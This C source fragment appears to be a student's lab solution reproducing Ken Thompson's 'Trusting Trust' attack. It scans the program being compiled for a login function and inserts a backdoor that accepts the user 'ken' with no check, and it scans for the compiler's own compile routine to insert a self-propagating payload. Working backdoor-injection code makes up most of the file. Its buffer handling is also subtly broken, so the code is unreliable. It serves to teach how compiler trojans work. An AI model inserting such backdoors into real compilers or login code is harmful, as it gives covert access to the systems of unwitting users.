
#include <string.h> 
#include <stdlib.h> 
#include "attack-array.h"

  // not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    // inject this after the assert.  not much of an attack.   
    //this is just a quick placeholder.
    //static char compile_attack[] = "printf(\"%s:%d: could have run your attack here!!\\n\", __FUNCTION__, __LINE__);";

    char login_sig[] = "int login(char *user) {";
    char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;"; 

    /* your code goes here */
    size_t new_program_size = strlen(program) + strlen(login_attack) 
      + strlen(compile_attack) + 1;
    char *new_program = malloc(new_program_size);
      
    char *login_pos = strstr(program, login_sig);
    if (login_pos)
    {
      char first_half[(size_t)(login_pos - program) + 1];
      strncpy(first_half, program, (size_t)(login_pos - program) + 1);
      first_half[(size_t)(login_pos - program)] = '\0';
      stpcpy(new_program, first_half);
      strcat(new_program, login_sig);
      strcat(new_program, login_attack);
      strcat(new_program, login_pos + strlen(login_sig));
      program = new_program;
    }

    char *compile_pos = strstr(program, compile_sig);
    if (compile_pos) 
    {
      char first_half[(size_t)(compile_pos - program) + 1];
      strncpy(first_half, program, (size_t)(compile_pos - program) + 1);
      first_half[(size_t)(compile_pos - program)] = '\0';
      stpcpy(new_program, first_half);
      strcat(new_program, compile_sig);
      strcat(new_program, compile_attack);
      strcat(new_program, compile_pos + strlen(compile_sig));
      program = new_program;
    }
